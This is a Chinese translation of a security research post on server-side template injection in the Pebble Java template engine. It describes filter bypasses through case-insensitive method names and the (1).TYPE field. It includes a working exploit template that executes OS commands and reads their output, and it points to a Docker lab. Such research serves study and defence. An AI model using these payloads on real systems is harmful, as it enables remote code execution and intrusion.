---
title: 【翻译】从Pebble看服务端模板注入漏洞
date: 2019-09-27 13:37:57
tags: 翻译
categories: 技术
cover: https://s2.ax1x.com/2019/11/12/M178mD.md.jpg
top_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg
---

SSTI并不是Web应用程序领域的一种新型漏洞。这些年来，从Flask/Jinja2模版到Twig模版，都存在着SSTI漏洞利用的先例。这篇译文是来自securitum公司首席安全研究员Michał Bentkowski的分析报告，是关于一款名为Pebble的Java 模板引擎的SSTI漏洞的分析与利用。

<!--more-->

下面译文开始

服务器端模板注入并不是Web应用程序领域的一个新漏洞。2015年，James Kettle曾在 PortSwigger blog发表[Server-Side Template Injection](https://portswigger.net/blog/server-side-template-injection)一文，使得服务端模板注入漏洞被大家熟知 。本文将由一个不太流行的Java模板引擎-[Pebble](https://pebbletemplates.io/)来引领大家探索服务端模板注入漏洞。

 

## Pebble与模板注入

根据官方文档，Pebble是一款Java 模板引擎，开发他的灵感来自于Twig。它具有很强的模板延续性和易于阅读的语法；出于安全性考虑，它内置自动转义功能，并包括对国际化的集成支持。它支持模板引擎中最常见的语法，其中变量替换使用{{variable}}完成。通常，在模板引擎中，可以包含任意的 Java 表达式。假设想将名为 name 的变量放在模板中并大写，这时可以使用 {name.toUpperCase()} 。

在 Java 中各种表达式语言中利用模板注入的常用方法是使用类似于以下内容的代码：

```java
variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls   -la')
```

基本上，Java中的每个对象都有一个称为 getClass()的方法，它可以通过检索特殊的 java.lang.class，轻而易举的获取任意 Java类的实例。因为它允许执行 OS 命令，下一步通常是获取 java.lang.Runtime 的实例。

```java
{{   variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la')   }}
```



## 尝试阻止在Pebble中获取任意类

Pebble 的作者针对攻击的添加了保护程序，并禁用了 getClass()方法调用。但是，有一种有趣的方法可以绕过保护，因为 Pebble 试图在表达式中精简查找method。假设有以下表达式：

```java
{{ someString.toUPPERCASE()   }}
```

因为正确的表达式是 toupperCase()而不toUPPERCASE()，所以此表达式并不运行。但是，因为Pebble 在设计时忽略了方法或属性名称中大小写问题，所以实际上使用上面的代码，也可以"正常"调用toUpperCase()。

所以，问题是当 Pebble 试图阻止访问getClass()时，它检查方法的名称时区分大小写。因此，可以只使用以下语句：

```java
{{ someString.getCLASS().forName(...)   }}
```

来绕过保护，拼写不敏感问题已经 2019 年 4 月 发布的3.0.9 版本中修复了。

几个月后，在研究其他一些与Java相关的内容并浏览文档时，我注意到有另一种内置方法可以访问java.lang.Class。Java 中的几个包装类（例如 java.lang.Integer）中有名为 TYPE 的字段，其Type为 java.lang.Class 自身；因此，执行任意代码的另一种方法如下所示：

```java
{{   (1).TYPE.forName(...) }}
```

我[于2019年7月向Pebble](https://github.com/PebbleTemplates/pebble/issues/454)报告[了该问题](https://github.com/PebbleTemplates/pebble/issues/454)，并使用与FreeMarker中相同的方法在master中修复了[该问题](https://github.com/PebbleTemplates/pebble/issues/454)相同的方法（即：在主控中修复了该问题方法调用黑名单）。因此，尽管我仍然可以执行{{ (1).TYPE }}，但是forName()方法被禁用，使得执行任意代码变得“不可能”。我将“不可能”一词用引号引起来，因为我认为仍然可以找到旁路绕过，但是我无法做到这一点。不过这将是可以进行研究的有趣空间。

 

## 读取命令的输出（Java 9+）

尽管在Java中很容易执行任意命令，但是在出现诸如服务器端模板注入之类漏洞的情况下，有时候会难以读取输出。它通常是通过遍历生成的 InputStream 或out-of-band传输层协议使用带外数据(传输层协议使用带外数据 译者注)来发送输出来完成的。

在研究Pebble时，我注意到在Java 9+中事情变得简单得多，因为现在`InputStream`有了便捷方法[readAllBytes](https://docs.oracle.com/javase/9/docs/api/java/io/InputStream.html#readAllBytes--)`来读取`返回字节数组，然后`byte[]`可以使用`String`构造函数转换为`String`。以下是漏洞利用代码：

 

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

 

结果：

![uKCtl6.png](https://s2.ax1x.com/2019/09/27/uKCtl6.png)

Pebble示例漏洞利用

## 玩转Pebble

如果您想玩转Pebble，我们准备了一个带有Docker容器的GitHub存储库，您可以在其中运行各种版本的Pebble。您可以在这里获取它：[https](https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble) : [//github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble](https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble)。

确保已经安装了`docker`和`docker-compose`，然后运行`docker-compose`，Web服务器就会在http：// localhost：4567上运行了。

![uKCN6K.png](https://s2.ax1x.com/2019/09/27/uKCN6K.png)

Docker应用程序的屏幕截图

## 总结

与许多的主流模板引擎相比，Pebble并没有本质上的不同；如果允许修改模板，则可以执行任意命令，因此建议确保未经授权的用户永远不能修改模板。